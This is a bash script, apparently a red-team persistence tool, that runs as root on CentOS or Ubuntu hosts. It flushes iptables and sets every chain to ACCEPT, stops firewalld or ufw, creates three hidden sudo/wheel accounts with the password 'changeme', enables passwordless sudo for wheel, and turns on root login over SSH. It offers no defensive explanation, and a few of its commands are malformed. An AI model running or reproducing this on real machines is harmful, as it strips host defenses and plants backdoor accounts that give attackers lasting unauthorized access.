#!/bin/bash

# Hacking? That's not very cash-money of you...
#
# This script must be run as root
# Its functions are as follows:
#	- Attempt to open firewall (U/C)
#	- Add sudo backup users
#	-

# Check Release to see if Ubuntu/CentOS
if [[ -f /etc/centos-release ]]
then
	#echo "CentOS" > /root/version.txt

	### DISABLE FIREWALL ###
	
	# OLD
	#service ipchains stop &>/dev/null
	#service iptables stop &>/dev/null
	#chkconfig ipchains off &>/dev/null
	#chkconfig iptables off &>/dev/null

	# NEW
	iptables -X & /dev/null
    	iptables -F &> /dev/null
    	iptables -t nat -F &> /dev/null
    	iptables -t nat -X &> /dev/null
    	iptables -t mangle -F &> /dev/null
    	iptables -t mangle -X &> /dev/null
	iptables -P INPUT ACCEPT &> /dev/null
    	iptables -P FORWARD ACCEPT &> /dev/null
    	iptables -P OUTPUT ACCEPT &> /dev/null

	# For the Newer versions
	firewall-cmd stop &>/dev/null
	firewall-cmd disable &>/dev/null
	
	### ADD USERS ###
	useradd -G wheel jmorris &>/dev/null
	echo "jmorris:changeme" | chpasswd &>/dev/null
	useradd -G wheel tgoodman &>/dev/null
	echo "tgoodman:changeme" | chpasswd &>/dev/null
	useradd -G wheel bmiller &>/dev/null
	echo "bmiller:changeme" | chpasswd &>/dev/null
	
	# Ensure sudo is working correctly
	sed -i 's/^#\s*\(%wheel\s*ALL=(ALL)\s*NOPASSWD:\s*ALL\)/\1/' /etc/sudoers &>/dev/null

	# Enable root login through ssh

	
elif [[ -f /etc/debian_version ]]
then
	#echo "Ubuntu" > /root/version.txt
	
	### DISABLE FIREWALL ON UBUNTU ###
	iptables -X & /dev/null
        iptables -F &> /dev/null
        iptables -t nat -F &> /dev/null
        iptables -t nat -X &> /dev/null
        iptables -t mangle -F &> /dev/null
        iptables -t mangle -X &> /dev/null
        iptables -P INPUT ACCEPT &> /dev/null
        iptables -P FORWARD ACCEPT &> /dev/null
        iptables -P OUTPUT ACCEPT &> /dev/null

	# UFW just in case...
	ufw disable &>/dev/null
	
	### ADD USERS ###
        useradd -G sudo jmorris &>/dev/null
        echo "jmorris:changeme" | chpasswd &>/dev/null
        useradd -G sudo tgoodman &>/dev/null
        echo "tgoodman:changeme" | chpasswd &>/dev/null
        useradd -G sudo bmiller &>/dev/null
        echo "bmiller:changeme" | chpasswd &>/dev/null
fi
#===============================================================================
# EDIT CONFIGURATION FILES #
#===============================================================================


# Enable Root login over ssh
sed 's/#\?\(PermitRootLogin\s*\).*$/\1 yes/' /etc/ssh/sshd_config > temp.txt
mv temp.txt /etc/ssh/sshd_config
rm -f temp.txt






















exit 0

